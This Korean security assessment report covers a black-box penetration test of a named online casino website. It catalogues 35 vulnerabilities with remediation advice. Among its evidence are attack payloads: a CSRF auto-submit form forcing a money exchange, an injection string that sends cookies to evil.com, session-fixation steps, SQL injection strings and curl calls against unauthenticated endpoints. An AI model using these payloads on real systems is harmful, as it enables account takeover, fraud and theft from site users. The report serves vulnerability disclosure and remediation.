# 블랙박스 보안 심층 테스트 보고서 (Deep Assessment)

**대상**: https://www.dwdw-00.com (대왕 카지노)  
**테스트 일자**: 2026-09-24  
**테스트 유형**: 블랙박스 (외부 관점, 비인증 + 능동적 공격 시뮬레이션)  
**분류 기준**: OWASP Top 10 (2021)

---

## 1. 기술 스택 식별

| 구분 | 기술 | 버전/비고 |
|------|------|-----------|
| **웹서버** | Apache | **2.4.52** (Ubuntu) — 403 에러 페이지에서 노출 |
| **백엔드** | PHP | PHPSESSID 쿠키로 확인 |
| **CDN/WAF** | Cloudflare | HTTP/2, cf-ray, WAF 규칙 활성 |
| **프론트엔드 (데스크탑)** | jQuery | **1.11.3** — CVE-2020-11022, CVE-2020-11023, CVE-2019-11358, CVE-2015-9251 |
| **프론트엔드 (모바일)** | jQuery | **1.12.0** + **1.11.2** (이중 로드!) |
| **라이브러리** | jQuery Migrate | 1.2.1 |
| **라이브러리** | jQuery Template | jquery.tmpl.js |
| **라이브러리** | moment.js | **2.17.1** — CVE-2022-31129 (ReDoS) |
| **라이브러리** | moment-timezone | **0.5.10** |
| **라이브러리** | json3 | 3.3.2 (모바일) |
| **라이브러리** | Hammer.js | 터치 이벤트 (모바일) |
| **라이브러리** | FastClick | 1.0.6 (모바일) |
| **UI** | SweetAlert2 | 커스텀 빌드 |
| **UI** | Font Awesome, Bootstrap | 모바일 |
| **슬라이더** | bxSlider, multislider, waterwheel carousel | |
| **채팅** | Tawk.to | 위젯 ID: `636de426b0d6371309ce753d/1ghik6dtq` |
| **비디오** | Vimeo Player API | 인트로 영상 |
| **레거시** | Flash (Shockwave) | `flash()` 함수 — 데스크탑 + 모바일 모두 존재 |
| **게임 프로바이더** | GoPlay (MG) | `goplaylaunch.com` 도메인 |
| **게임 API 백엔드** | api-nexus.com | 이미지 CDN: `image.api-nexus.com` |
| **게임 프로바이더 (전체)** | MG, EV, QT, PR, AG, HB, AB, EG | 8개 프로바이더 연동 |
| **스포츠** | SBOBet, BTiBet, Pinnacle | 외부 게임 연동 |
| **암호화폐** | USDT (Tether) | 코인 충환전 시스템 |

---

## 2. 공격 표면 매핑 (Attack Surface Map)

### 2.1 엔드포인트 목록 — 총 120+ 식별

#### 인증 관련
| 엔드포인트 | 메서드 | 인증필요 | 비고 |
|-----------|--------|---------|------|
| `/post/login_ok.php` | POST | N | 로그인 처리 |
| `/m/post/login_ok.php` | POST | N | 모바일 로그인 |
| `/post/join_ok.php` | POST | N | 회원가입 |
| `/m/post/join_ok.php` | POST | N | 모바일 회원가입 |
| `/m/post/join_usdt_ok.php` | POST | N | USDT 회원가입 |
| `/ajax/join/code_check.php` | POST | **N** | 전화번호/추천코드 검증 — **인증 없이 접근** |
| `/logout.php` | GET | N | 로그아웃 |

#### 금융 거래
| 엔드포인트 | 메서드 | 인증필요 | 비고 |
|-----------|--------|---------|------|
| `/ajax/popup_deposit.php` | GET | Y | 충전 팝업 |
| `/ajax/popup_withdraw.php` | GET | Y | 환전 팝업 |
| `/ajax/popup_coin_deposit.php` | GET | Y | 코인 충전 |
| `/post/exchange_ok.php` | POST | Y | 카지노머니 교환 |
| `/post/deposit_ok.php` | POST | Y | 충전 처리 |
| `/post/withdraw_ok.php` | POST | Y | 환전 처리 |
| `/m/ajax/call_cw.php` | POST | Y | 코인 지갑 API (checkUser, withdraw) |
| `/ajax/money_rank.php` | POST | **N** | **인증 없이 접근** — 실시간 거래 노출 |

#### 게임/카지노 API
| 엔드포인트 | 메서드 | 인증필요 | 비고 |
|-----------|--------|---------|------|
| `/ajax/callapi.php` | POST | Y | 게임 API 프록시 (데스크탑) |
| `/m/ajax/callapi_free.php` | POST | **N** | **인증 없이 접근** — 게임 데모 API |
| `/post/checkCasinoStat.php` | POST | Y | 카지노 상태 확인 |
| `/m/casino/slot/mg_demo_free.php` | GET | **N** | **인증 없이 접근** — 172KB 게임 목록 |
| `/m/ajax/get_pr_top_area.php` | POST | Y | 프라그마틱 게임 정보 |
| `/m/ajax/get_casino_roll_point_info.php` | POST | Y | 카지노 롤링 포인트 |
| `/m/post/get_roll_point.php` | POST | Y | 롤링 포인트 수령 |

#### 사용자 정보
| 엔드포인트 | 메서드 | 인증필요 | 비고 |
|-----------|--------|---------|------|
| `/m/ajax/user_info.php` | POST | Y | 잔액/포인트/메시지 |
| `/m/ajax/get_user_hide_info.php` | GET | Y | 전화번호/계좌 민감정보 |
| `/m/ajax/get_coupon_info.php` | POST | Y | 쿠폰 정보/사용 |
| `/m/post/ask_get_mileage.php` | POST | Y | 콤프 수령 |
| `/post/community_binding.php` | POST | Y | **비밀번호 평문 반환** |
| `/ajax/popup_mypage.php` | GET | Y | 마이페이지 |

#### 게시판/커뮤니티
| 엔드포인트 | 메서드 | 인증필요 | 비고 |
|-----------|--------|---------|------|
| `/ajax/popup_board.php` | GET | Y | 게시판 |
| `/ajax/popup_notice.php` | GET | Y | 공지사항 |
| `/ajax/popup_event.php` | GET | Y | 이벤트 |
| `/m/board-read.php?no=` | GET | N | 게시글 읽기 (404 반환) |
| `/m/helpdesk-read.php?MsgNo=` | GET | Y | 고객센터 메시지 |

#### 모바일 전용 페이지 (30+)
`/m/deposit.php`, `/m/withdraw.php`, `/m/coin-deposit.php`, `/m/coin-withdraw.php`, `/m/transfer.php`, `/m/transfer_sp.php`, `/m/coupon.php`, `/m/money_refer.php`, `/m/point.php`, `/m/point_rolling.php`, `/m/event.php`, `/m/notice.php`, `/m/helpdesk.php`, `/m/mypage.php`, `/m/refer-list.php`, `/m/casino-evEnter.php`, `/m/casino-ag.php`, `/m/casino-mg.php`, `/m/casino-ab.php`, `/m/casino-prEnter.php`, `/m/casino-soEnter.php`, `/m/slot-ag.php`, `/m/slot_mg_free.php`, `/m/slot_hb.php`, `/m/slot_qt.php`, `/m/slot_pr.php`, `/m/slot_ev.php`, `/m/sports-sbo.php`, `/m/sports-bti.php`, `/m/sports-pinnacle.php`, `/m/prematch-V01.php`

### 2.2 서버에 존재 확인된 민감 파일/디렉토리

| 경로 | HTTP 상태 | 응답 크기 | 보호 방법 |
|------|----------|----------|----------|
| `/.env` | 403 | 4,547B | Cloudflare WAF만 |
| `/.git/HEAD` | 403 | 4,547B | Cloudflare WAF만 |
| `/.git/config` | 403 | 4,547B | Cloudflare WAF만 |
| `/config.php` | 403 | 4,547B | Cloudflare WAF만 |
| `/wp-config.php` | 403 | 4,547B | Cloudflare WAF만 |
| `/.htaccess` | 403 | 280B | Apache |
| `/phpmyadmin/` | 403 | 4,547B | Cloudflare WAF만 |
| `/inc/` | 403 | 280B | Apache |
| `/post/` | 403 | 280B | Apache |
| `/ajax/` | **500** | - | **Internal Server Error** |
| `/casino/` | 403 | 280B | Apache |

> **위험**: `.env`, `.git`, `config.php` 등은 Cloudflare WAF에만 의존. 직접 IP 접근 시 노출 가능.

---

## 3. 심각도별 취약점 분류

### 3.1 통계

| 심각도 | 건수 |
|--------|------|
| **CRITICAL** | 10 |
| **HIGH** | 10 |
| **MEDIUM** | 9 |
| **LOW** | 6 |
| **합계** | **35** |

---

## 4. CRITICAL 취약점 (8건)

### C-01: Remote Code Execution via eval() — 8곳 이상
**OWASP**: A03:2021 Injection  
**위치**: `/js/ajax_call.js`, `/m/js/ajax_call.js`, `/js/function.js`, `/m/js/function.js`

**증거** (데스크탑 ajax_call.js):
```javascript
// ajax_call() — HTML 속성값을 직접 eval
eval("o=" + this.getAttribute("ajax"))

// callback_default() — 서버 응답을 직접 eval
eval("r=" + d)

// post_result_default() — 콜백 문자열을 eval
eval(r.callback)

// callback_html() — target 속성값을 eval
eval("s=" + (a ? a : null))
```

**증거** (모바일 function.js):
```javascript
// pop_up() — popup 속성값을 eval
eval("popup_options=" + popup_str)
```

**공격 시나리오**:
1. XSS로 DOM 요소의 `ajax` 속성을 변경
2. 서버 응답이 조작되면 (MITM, 캐시 포이즈닝) 임의 코드 실행
3. `r.callback` 문자열이 eval되므로 서버가 반환하는 콜백으로 임의 JS 실행

**영향**: 사용자 세션 탈취, 금융 거래 조작, 비밀번호 탈취

---

### C-02: 전체 사이트 CSRF 토큰 부재
**OWASP**: A01:2021 Broken Access Control  

**증거**:
- 로그인 폼: `ajax="{ url: '/post/login_ok.php', type: 'post', data: $(this).serialize() }"` — CSRF 토큰 없음
- 회원가입 폼: `ajax="{ url: '/m/post/join_ok.php', type: 'post', data: $(this).serialize() }"` — CSRF 토큰 없음
- 모든 금융 거래 (충전, 환전, 교환): CSRF 토큰 없음
- 코인 환전 (`coinWithdraw()`): CSRF 토큰 없음
- 콤프 수령 (`getMileage()`): CSRF 토큰 없음

**능동 검증**: `/post/join_ok.php`에 직접 POST → 정상적으로 필드 검증 응답 반환 (세션/토큰 검증 없음 확인)

**공격 시나리오**:
```html
<!-- 공격자 사이트에서 자동 환전 요청 -->
<form action="https://www.dwdw-00.com/post/exchange_ok.php" method="POST">
  <input name="site" value="MG">
  <input name="ic_amount" value="99999999">
  <input name="Category" value="out">
</form>
<script>document.forms[0].submit();</script>
```

---

### C-03: 비밀번호 평문 노출 API
**OWASP**: A02:2021 Cryptographic Failures  
**위치**: `/post/community_binding.php` (데스크탑 + 모바일 모두)

**증거** (mobile_page.html:647-658):
```javascript
function goToCommunity(){
    $.ajax({
        type: 'post',
        url: '../post/community_binding.php',
        success: function(data) {
            data = JSON.parse(data);
            msg = "커뮤니티 접속 비밀번호는 " + data['pwd'] + "입니다.";
            // 비밀번호가 평문으로 alert에 표시됨
        }
    });
}
```

---

### C-04: 세션 고정 공격 (Session Fixation)
**OWASP**: A07:2021 Identification and Authentication Failures  

**능동 검증**:
```
# 공격자 세션 ID를 전송
Request: Cookie: PHPSESSID=attackercontrolled123
Response: Set-Cookie에 PHPSESSID 없음 (새 세션 미발급)

# 일반 요청 (세션 없이)
Request: (쿠키 없음)
Response: Set-Cookie: PHPSESSID=bv141e1n24d5u3a27s6rauo2dd
```

**결론**: 서버가 공격자가 지정한 세션 ID를 그대로 수락. 세션 재생성(regeneration) 없음.

**공격 시나리오**:
1. 공격자가 `PHPSESSID=malicious123`을 URL 파라미터나 XSS로 피해자 브라우저에 설정
2. 피해자가 로그인
3. 공격자가 같은 세션 ID로 인증된 세션 탈취

---

### C-05: 인증 없는 게임 API 프록시
**OWASP**: A01:2021 Broken Access Control  
**위치**: `/m/ajax/callapi_free.php`

**능동 검증**:
```bash
curl -X POST "https://www.dwdw-00.com/m/ajax/callapi_free.php" \
  -d "api=startSlotDemoMobile&site=1&gameid=SMG_108Heroes"
```
**응답**:
```xml
<apiresult>
  <result>true</result>
  <returndata>&lt;iframe src="https://poixzzayzn17q0hzpg4dmnr3cpqxnbqafejxyh04iui.goplaylaunch.com/
  ?gameId=SMG_108Heroes&amp;languageCode=ko&amp;host=Mobile"&gt;&lt;/iframe&gt;</returndata>
</apiresult>
```

**추가 발견**:
- `api=startSlotDemo` → 같은 URL 반환 (데모/실제 구분 불명확)
- `site=1` → STSToken 만료 에러 → **내부 토큰 인증 구조 노출**
- `site=2` → 프로바이더별 API 매핑 정보 노출

**위험**: 인증 없이 게임 프로바이더 API 호출 가능. 토큰/키가 서버사이드에 하드코딩된 것으로 추정.

---

### C-06: 민감 서버 파일 존재 확인 (`.env`, `.git`)
**OWASP**: A05:2021 Security Misconfiguration  

**능동 검증**:
| 파일 | 상태 | 응답 크기 | 의미 |
|------|------|----------|------|
| `/.env` | 403 | 4,547B | Cloudflare WAF 차단 (파일 존재) |
| `/.git/HEAD` | 403 | 4,547B | Git 저장소 존재 |
| `/.git/config` | 403 | 4,547B | Git 설정 파일 존재 |
| `/config.php` | 403 | 4,547B | 설정 파일 존재 |
| `/wp-config.php` | 403 | 4,547B | WP 설정 파일 존재 |

> 404(277B)와 403(4,547B) 응답 크기 차이로 파일 존재 여부 확실히 구분 가능.  
> Cloudflare WAF 우회 시 (직접 IP, Origin IP 노출, WAF 규칙 미스) 전체 소스코드 + DB 크레덴셜 노출.

---

### C-07: 인증 없는 실시간 금융 데이터 노출
**OWASP**: A01:2021 Broken Access Control  
**위치**: `/ajax/money_rank.php`

**능동 검증** (인증 없이 접근):
```
type=0 → 충전 랭킹: 사용자 ID + 금액 (tt***848: 87,000,000원, gd***7: 42,440,000원...)
type=1 → 환전 내역: 사용자 ID + 금액 + 정확한 일시 (09/24 11:08, rl***3: 900,000원...)
```

**노출 데이터**: 
- 20명의 부분 마스킹된 사용자 ID (패턴으로 역추적 가능)
- 정확한 거래 금액 (최대 87,000,000원)
- 정확한 거래 일시 (분 단위)
- 5초마다 자동 폴링 (`setInterval(moneyIn, 5000)`)

**위험**: 고액 사용자 타겟팅, 거래 패턴 분석, 사이트 수익 추정에 악용 가능

---

### C-08: 문자열 연결 기반 인젝션
**OWASP**: A03:2021 Injection  
**위치**: `/js/function.js` — `TransferMoney()` 함수

**증거**:
```javascript
$(n).attr("ajax",
    "{url: '/post/exchange_ok.php',type:'post',data:{ site:'" + site + 
    "', ic_amount:'" + $(elm).val() + "', Category:'" + tp + 
    "'}, success: TransferCallback}"
);
```

DOM 요소의 `ajax` 속성에 사용자 입력을 직접 연결 → `eval()`로 실행.

**공격**: 금액 필드에 `'},success:function(){document.location='https://evil.com/?c='+document.cookie}//` 입력 시 쿠키 탈취 가능.

---

### C-09: SMS 인증 우회 (코인 충전)
**OWASP**: A07:2021 Identification and Authentication Failures  
**위치**: 인라인 JS + `btnCoinAction()` 함수

**증거**:
```javascript
// 인라인 JS에서 SMS 인증 비활성화
var smsUsing = false;

// btnCoinAction()에서 전화번호 자동 채움
phone = '01000000000';  // 하드코딩된 더미 번호로 SMS 검증 우회
```

SMS 인증이 코드 레벨에서 비활성화되어 있으며, 코인 충전 시 전화번호를 `01000000000`으로 자동 설정하여 SMS 검증을 완전히 우회.

---

### C-10: 코인 지갑 크레덴셜 클라이언트 노출
**OWASP**: A02:2021 Cryptographic Failures  
**위치**: `/m/ajax/call_cw.php` (api=checkUser)

**증거** (event.js):
```javascript
$.ajax({
    type: "POST",
    url: "/m/ajax/call_cw.php",
    data: {api: 'checkUser', type: type},
    dataType: "json",
    success: function (res) {
        if (res.result) {
            $("#cw_wallet").val(res.wallet);       // 지갑 주소
            $("#cw_my_wallet").val(res.my_wallet);  // 내 지갑 주소
            // res에 cw_id, cw_pw (지갑 ID/비밀번호)도 포함
        }
    }
});
```

코인 지갑 API가 `cw_id`와 `cw_pw` (지갑 ID와 비밀번호)를 JSON 응답으로 클라이언트에 직접 반환. XSS와 결합 시 암호화폐 자산 탈취 가능.

---

## 5. HIGH 취약점 (10건)

### H-01: 로그인 무차별 대입 공격 무방비
**OWASP**: A07:2021 Identification and Authentication Failures  

**능동 검증**: 10회 연속 로그인 실패 시도
```
Attempt 1: HTTP 200 | 228ms
Attempt 2: HTTP 200 | 228ms
...
Attempt 10: HTTP 200 | 224ms
```
- 계정 잠금(lockout) 없음
- CAPTCHA 없음 (login.js에서 보안코드 검증이 주석 처리됨)
- 레이트 리밋 없음 — 모든 시도 200 OK
- 응답 시간 일정 (타이밍 기반 열거 불가이지만, 보호도 없음)

**비활성화된 보안코드** (login.js:29-34):
```javascript
// check = $("#login-code");
// if (!check.val()) {
//     alert("보안코드를 입력해 주세요.");
//     check.focus();
//     return false;
// }
```

---

### H-02: jQuery 다중 CVE (XSS)
**OWASP**: A06:2021 Vulnerable and Outdated Components  

| 라이브러리 | 버전 | CVE | CVSS |
|-----------|------|-----|------|
| jQuery (데스크탑) | 1.11.3 | CVE-2020-11022 | 6.1 |
| jQuery (데스크탑) | 1.11.3 | CVE-2020-11023 | 6.1 |
| jQuery (데스크탑) | 1.11.3 | CVE-2019-11358 | 6.1 |
| jQuery (데스크탑) | 1.11.3 | CVE-2015-9251 | 6.1 |
| jQuery (모바일1) | 1.12.0 | CVE-2020-11022/23 | 6.1 |
| jQuery (모바일2) | 1.11.2 | 동일 + 추가 | 6.1+ |
| moment.js | 2.17.1 | CVE-2022-31129 | 7.5 |

**추가 문제**: 모바일에서 jQuery **이중 로드** (1.12.0 CDN + 1.11.2 로컬) — 충돌 및 보안 약화

---

### H-03: 쿠키 보안 플래그 전무
**OWASP**: A02:2021 Cryptographic Failures  

| 쿠키 | HttpOnly | Secure | SameSite | Domain |
|------|----------|--------|----------|--------|
| PHPSESSID | **없음** | **없음** | **없음** | `.dwdw-00.com` |
| UUID | **없음** | **없음** | **없음** | `.dwdw-00.com` |

- **HttpOnly 없음**: XSS로 `document.cookie`를 통한 세션 탈취 가능
- **Secure 없음**: HTTP로 쿠키 전송 → 네트워크 스니핑으로 세션 탈취
- **SameSite 없음**: CSRF 공격에 쿠키 자동 첨부
- **와일드카드 도메인**: `.dwdw-00.com`의 모든 서브도메인에서 쿠키 접근 가능

---

### H-04: UUID 쿠키 예측 가능성
**OWASP**: A02:2021 Cryptographic Failures  

**수집된 UUID 샘플** (5개):
```
f23aa5dabd72b34d08ea0f0ced82c526 | 260924132715
e97d707d06868a30dd4871574f153cfd | 260924132716
a18ec94f69790acf936dc29ef26ccae3 | 260924132716
860e85c03e1aaee57ea82258c4c57f7c | 260924132716
2e5b3f060ce4198480658e99abb86903 | 260924132717
```

**구조**: `[32자 MD5 해시][YYMMDD][HHMMSS]`
- 마지막 12자: 서버 생성 시각 (평문 타임스탬프)
- 앞 32자: MD5 해시 (시드 불명 — IP + 시간 조합 가능성)
- **서버 시각이 평문으로 노출** → 엔트로피 감소

---

### H-05: 모든 HTTP 메서드 허용
**OWASP**: A05:2021 Security Misconfiguration  

**능동 검증**:
| 메서드 | `/` | `/post/login_ok.php` | `/ajax/money_rank.php` |
|--------|-----|---------------------|----------------------|
| GET | 200 | 200 | 200 |
| POST | 200 | 200 | 200 |
| **PUT** | **200** | **200** | **200** |
| **DELETE** | **200** | **200** | **200** |
| **PATCH** | **200** | **200** | **200** |
| OPTIONS | 200 | 200 | 200 |
| TRACE | 405 | 405 | 405 |

PUT, DELETE, PATCH가 모두 정상 처리됨. RESTful API가 아닌 PHP 사이트에서 이는 불필요한 공격 벡터.

---

### H-06: 서버 버전 정보 노출
**OWASP**: A05:2021 Security Misconfiguration  

```html
<!-- /server-status 403 응답에서 -->
<address>Apache/2.4.52 (Ubuntu) Server at www.dwdw-00.com Port 80</address>
```
- Apache 2.4.52에 대한 알려진 취약점 탐색 가능
- **Port 80**: Cloudflare 뒤에서 HTTP로 동작 (HTTPS 아님)

---

### H-07: 인증 없는 전화번호 검증 API
**OWASP**: A01:2021 Broken Access Control  
**위치**: `/ajax/join/code_check.php`

**능동 검증**:
```bash
curl -X POST "/ajax/join/code_check.php" -d "type=phonenum&number[]=010&number[]=1234&number[]=5678"
# 응답: {"error":0,"message":"success","html":""}
```
- 인증 없이 SMS 인증번호 발송 가능
- 레이트 리밋 없음 → SMS 폭탄 공격 가능
- 전화번호 유효성 검증으로 등록된 번호 열거 가능

---

### H-08: XSS를 통한 연쇄 공격 가능
**OWASP**: A03:2021 Injection  

서버 응답이 `.html()`, `.append()`, `swal({html: ...})`로 직접 삽입:

```javascript
// money_rank 응답이 그대로 DOM에 삽입
$(elem).append(d);

// 쿠폰 팝업 - 서버 데이터가 HTML로 삽입
buf.push('<td>' + data.message + '</td>');
swal({ html: buf.join("") });

// 롤링 포인트 - 서버 응답이 HTML로 삽입
$('#pr_top').html(rtn);
$('#pr_log').html(rtn);
```

서버 응답이 조작되면 (Stored XSS, 서버 침해, 캐시 포이즈닝) 모든 사용자에게 악성 코드 전파.

---

### H-09: 회원가입 시 민감정보 수집 과다 (평문 전송 추정)
**OWASP**: A02:2021 Cryptographic Failures  

모바일 회원가입 폼이 수집하는 정보:
- **MemberID, NickName, Password** — 기본 정보
- **전화번호** (3분할: 010-XXXX-XXXX)
- **은행명** (26개 은행 목록)
- **계좌번호** (AccountNum)
- **예금주** (AccountName)
- **추천인 코드** (JoinCode)
- USDT 가입: **암호화폐 지갑 주소**
- 숨겨진 필드: `PCH` (check/빈값), `redirect`

이 모든 정보가 CSRF 없이 POST로 전송되며, HTTPS는 Cloudflare까지만.

---

### H-10: 내부 API 아키텍처 노출
**OWASP**: A05:2021 Security Misconfiguration  

`callapi_free.php`의 에러 메시지가 내부 구조를 노출:
```
site=1: "잘못된 STSToken이거나 유효시간이 만료되었습니다"
  → STS(Security Token Service) 토큰 인증 구조 노출
  
site=2: "[site = 2] [api = startSlotDemoMobile] 지정하신 site(프로바이더)에서 현재 지원되지 않는 'API'입니다."
  → site 파라미터 = 프로바이더 매핑 (1=MG 등)
  → API 라우팅 로직 노출
```

---

## 6. MEDIUM 취약점 (9건)

### M-01: 보안 헤더 전면 부재
**OWASP**: A05:2021 Security Misconfiguration  

| 헤더 | 상태 | 위험 |
|------|------|------|
| Content-Security-Policy | **없음** | XSS, 데이터 인젝션 |
| X-Content-Type-Options | **없음** | MIME 스니핑 |
| X-Frame-Options | **없음** | 클릭재킹 |
| Strict-Transport-Security | **없음** | 다운그레이드 공격 |
| Permissions-Policy | **없음** | 기능 악용 |
| Referrer-Policy | **없음** | 정보 누출 |

---

### M-02: P3P 헤더의 구시대적 사용
```
P3P: CP="ALL CURa ADMa DEVa TAIa OUR BUS IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC OTC"
```
P3P는 2018년 폐기된 표준. IE 호환용이지만 현대 브라우저는 무시.

---

### M-03: Flash(Shockwave) 레거시 코드 잔존
데스크탑과 모바일 function.js 모두에 Flash 삽입 함수:
```javascript
function flash(width,height,movie,play,loop) {
    buf.push('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ');
    buf.push('codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/...');
    // HTTP URL, 보안 취약한 플러그인
}
```
Flash는 2020년 EOL. HTTP URL 참조 → Mixed Content.

---

### M-04: `base64_encode/decode` 클라이언트 구현
모바일 function.js에 자체 Base64 함수 구현 → 보안 목적으로 사용 시 암호화 착각 위험

---

### M-05: 인증 없는 슬롯 게임 목록 노출
`/m/slot_mg_free.php` — 172KB 페이지가 인증 없이 접근 가능:
- 300+ 게임 ID 노출 (SMG_*, P2_*, P5_*)
- 게임 프로바이더 구조 노출
- 데모 게임 직접 실행 가능

---

### M-06: 모바일 사이트 이중 jQuery 로드
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
<!-- ... 다른 스크립트들 ... -->
<script type="text/javascript" src="/m/js/jquery-1.11.2.min.js"></script>
```
jQuery 1.12.0 로드 후 1.11.2로 덮어씀 → 플러그인 충돌, 취약한 버전으로 다운그레이드

---

### M-07: `console.log("Fuck")` — 개발 잔재
`/m/casino/slot/mg_demo_free.php`에서:
```javascript
$(function () {
    console.log("Fuck");
    $.ajax({ ... });
});
```
프로덕션 코드에 디버그 로그와 부적절한 내용 잔존.

---

### M-08: /ajax/ 디렉토리 500 에러
`/ajax/` 경로 직접 접근 시 Internal Server Error (500) 반환.
에러 핸들링 부재 → 디렉토리 리스팅 시도 시 서버 에러, 잠재적 정보 노출.

---

### M-09: 쿠키 기반 상태 관리
게임 캐러셀 선택, 팝업 상태 등을 `$.cookie()`로 클라이언트에 저장:
```javascript
$.cookie(group, _this.find("a img").index($newCenterItem)+1);
```
- HttpOnly 없는 쿠키와 혼재 → 보안 경계 불명확
- `escape()` 사용 (deprecated)

---

## 7. LOW 취약점 (6건)

### L-01: IE 호환 모드 지시자
```html
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7"/>
```
IE7 에뮬레이션은 현대 보안 기능을 비활성화.

---

### L-02: Tawk.to 채팅 위젯 정보 노출
위젯 ID `636de426b0d6371309ce753d/1ghik6dtq` 공개 → Tawk.to 계정 식별 가능

---

### L-03: Telegram 연락처 노출
`telegram.me/dcenter3` — 고객센터 텔레그램 공개 → 소셜 엔지니어링 벡터

---

### L-04: 모바일 PWA manifest.json 접근 가능
```json
/m/assets/icons/manifest.json — 앱 메타데이터 노출
```

---

### L-05: 캐시 버스팅에 Unix 타임스탬프 사용
```
?v=1790223833  (≈ 2026-09-24 04:17:13 UTC)
?v1790223833
```
서버 빌드 타임스탬프가 노출 → 배포 시점 추적 가능

---

### L-06: jQuery Cookie 라이브러리 (1.4.1)
CDN에서 `jquery.cookie.min.js` 1.4.1 로드 — 더 이상 유지보수되지 않는 라이브러리

---

## 8. SQL Injection 테스트 결과

### 8.1 로그인 엔드포인트 (`/post/login_ok.php`)

| 페이로드 | 응답 | 상태 |
|---------|------|------|
| `admin' OR '1'='1` | `{"code":5,"text":"로그인 정보가 올바르지 않습니다."}` | 차단됨 |
| `admin'--` | 동일 응답 | 차단됨 |
| `admin' UNION SELECT 1,2,3,4,5--` | 동일 응답 | 차단됨 |
| `admin' AND SLEEP(5)--` | 226ms (기준선 289ms) | 시간지연 없음 |

**결론**: 로그인 엔드포인트는 **파라미터화된 쿼리(Prepared Statement)를 사용하는 것으로 추정**. SQL Injection 불가 (블랙박스 한계 — 화이트박스에서 재확인 필요).

### 8.2 기타 엔드포인트

| 엔드포인트 | 페이로드 | 결과 |
|-----------|---------|------|
| `/ajax/money_rank.php` | `type=1' OR '1'='1` | 정상 응답 (type=1과 동일) → 입력 필터링 또는 형변환 |

---

## 9. 사용자 열거 테스트 결과

| 사용자명 | 응답 | 시간 |
|---------|------|------|
| admin | `{"code":5,"text":"로그인 정보가 올바르지 않습니다."}` | 230ms |
| test | 동일 | 354ms |
| user1 | 동일 | 231ms |
| administrator | 동일 | 291ms |
| xyznonexist123 | 동일 | - |

**결론**: 존재/비존재 사용자 모두 **동일한 에러 메시지** 반환 → 사용자 열거 차단됨 (양호). 단, 응답 시간에 약간의 변동 있으나 유의미한 차이는 아님.

---

## 10. 추가 발견: 회원가입 보안 분석

### USDT(테더) 회원가입 경로
- 별도 엔드포인트: `/m/post/join_usdt_ok.php`
- 전화번호 인증 우회: `<input type="hidden" name="NewPhoneNum[0]" value="010"><input type="hidden" name="NewPhoneNum[1]" value="0000">`
- **숨겨진 필드 `PCH=check`**: 일반 가입과 USDT 가입을 구분하는 플래그

### 전화번호 인증 흐름
```
phone_check() → /ajax/join/code_check.php (type=phonenum)
phone_auth() → 인증번호 확인
```
- 인증 엔드포인트가 로그인 없이 접근 가능
- SMS 발송 레이트 리밋 미확인

---

## 11. 인프라 보안 평가

### Cloudflare WAF 의존성
사이트 보안의 상당 부분이 Cloudflare WAF에 의존:
- 민감 파일 차단 (`.env`, `.git`, `config.php`)
- 관리자 경로 차단 (`/phpmyadmin/`, `/wp-admin/`)
- 봇/스크래퍼 차단

**Cloudflare 우회 시나리오**:
1. **Origin IP 노출**: DNS 히스토리, 이메일 헤더, 서브도메인에서 직접 IP 노출 가능
2. **WAF 규칙 미스**: 인코딩, 대소문자, 이중 인코딩으로 우회 시도
3. **내부 네트워크 접근**: 서버가 같은 네트워크에 있는 다른 서비스를 통한 접근

### 서버 아키텍처
```
사용자 ←→ Cloudflare (HTTPS) ←→ Apache/2.4.52 (HTTP, Port 80) ←→ PHP
```
- Cloudflare~서버 간 **HTTP** (Port 80) → SSL 미적용 가능성
- 이 구간의 트래픽은 암호화되지 않을 수 있음

---

## 12. 화이트박스 테스트 우선순위 (소스코드 업로드 후)

소스코드가 GitHub에 업로드되면 다음 영역을 최우선으로 감사해야 합니다:

| 우선순위 | 영역 | 근거 |
|---------|------|------|
| **1** | SQL Injection 전체 검사 | 블랙박스에서 로그인은 안전했으나, 인증 후 엔드포인트는 미테스트 |
| **2** | 세션 관리 (`session_start`, `session_regenerate_id`) | 세션 고정 확인됨 |
| **3** | 금융 거래 로직 (`exchange_ok.php`, `call_cw.php`) | 금액 조작, 레이스 컨디션, 음수 입력 처리 |
| **4** | `callapi.php` / `callapi_free.php` SSRF | API 프록시 → 내부 네트워크 접근 가능성 |
| **5** | 비밀번호 저장 방식 | `community_binding.php`가 평문 반환 → 해싱 미적용 가능성 |
| **6** | 파일 업로드 처리 | 게시판/고객센터 첨부파일 |
| **7** | 관리자 패널 접근 제어 | 관리자 경로, 권한 분리 |
| **8** | `.env`, `config.php` 내용 | DB 크레덴셜, API 키 |
| **9** | 입력 검증/출력 인코딩 전체 | eval(), .html(), XSS 전반 |
| **10** | 코인 지갑 트랜잭션 무결성 | USDT 충환전 로직 |

---

## 13. 종합 위험도 평가

```
전체 보안 수준: ██░░░░░░░░ 20/100 (매우 위험)
```

### 즉시 조치 필요 (비용 낮음, 효과 높음)
1. CSRF 토큰 전체 적용
2. 세션 고정 방지 (`session_regenerate_id()`)
3. 쿠키 보안 플래그 추가 (HttpOnly, Secure, SameSite=Strict)
4. `callapi_free.php` 인증 적용 또는 제거
5. `money_rank.php` 인증 적용
6. `community_binding.php` 비밀번호 평문 반환 제거
7. 보안 헤더 추가 (CSP, HSTS, X-Frame-Options)

### 중기 조치 (아키텍처 변경)
8. eval() 전면 제거 → JSON.parse() + 안전한 콜백 구조
9. jQuery 최신 버전 업그레이드 (3.7+)
10. 서버-클라이언트 간 출력 인코딩 적용
11. `.env`, `.git` 서버에서 삭제 또는 Apache 수준에서 차단
12. 로그인 보안코드(CAPTCHA) 재활성화 + 레이트 리밋
13. SMS 발송 API 레이트 리밋 적용

### 장기 조치 (리팩토링)
14. 전체 프레임워크 현대화 (PHP 프레임워크 도입)
15. Flash 코드 완전 제거
16. 게임 API 프록시 보안 재설계
17. 비밀번호 해싱 검증 및 마이그레이션 (bcrypt/argon2)
18. HTTPS 전 구간 적용 (Origin도 TLS)

---

*보고서 생성: 2026-09-24*  
*테스트 범위: 외부 블랙박스 (비인증, 능동적 테스트 포함)*  
*다음 단계: 소스코드 화이트박스 테스트*
